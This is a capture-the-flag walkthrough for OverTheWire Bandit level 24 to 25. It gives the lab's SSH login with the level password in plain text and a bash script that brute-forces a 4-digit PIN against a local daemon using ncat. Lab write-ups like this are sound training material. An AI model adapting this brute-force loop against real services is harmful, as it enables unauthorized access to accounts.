---
title: "Bandit: Level 24 => Level 25"
date: 2020-01-25
weight: 24
---

A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pin code. There is no way to retrieve the pin code except by going through all the 10000 combinations, called brute-forcing.

### Here are the details which we have from the previous level:

* **Host:** `bandit.labs.overthewire.org`
* **Port:** `2220`
* **Username:** `bandit24`
* **Password:** `gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8`

***

#### So, The SSH syntax will be:

```bash
sshpass -p gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 ssh bandit24@bandit.labs.overthewire.org -p 2220
```

To solve the challenge, we need to brute-force the password for bandit25 by trying all possible 4-digit PIN codes along with the known password for bandit24 on port 30002.

#### Script Creation:

We create a script that iterates through all 4-digit combinations (0000 to 9999) and attempts to connect to the daemon on port 30002 using the password of bandit24 and each PIN.

```bash
bandit24_pass="gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8"

for pin in {0000..9999}; do
    result=$(echo "$bandit24_pass $pin" | ncat localhost 30002)
    if echo "$result" | grep -q "Wrong!"; then
        echo "Trying with PIN: $pin"
    else
        echo -e "\nCorrect PIN found: $pin\nTrying to retrieve password for the next level :)\n"
        echo "$bandit24_pass $pin" | ncat localhost 30002
        break
    fi
done
```

* **Looping Through PINs:** The script uses a loop (`for i in {0000..9999}`) to try each PIN code from 0000 to 9999.
* **Combining Password and PIN:** For each iteration, it combines the known password (`gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8`) with the current PIN (`$pin`).
* **Connecting to Daemon:** It uses `ncat` to connect to the daemon running on port 30002 of the local machine (`localhost`).
* **Checking Response:** If the daemon responds with "Wrong!", it continues to the next PIN.
* **Success:** When it finds the correct PIN, it prints a message indicating success and attempts to retrieve the password for bandit25.

<figure><img src="/images/Bandit/Level%2024%20to%20Level%2025%201.png" alt=""><figcaption></figcaption></figure>

<figure><img src="/images/Bandit/Level%2024%20to%20Level%2025%202.png" alt=""><figcaption></figcaption></figure>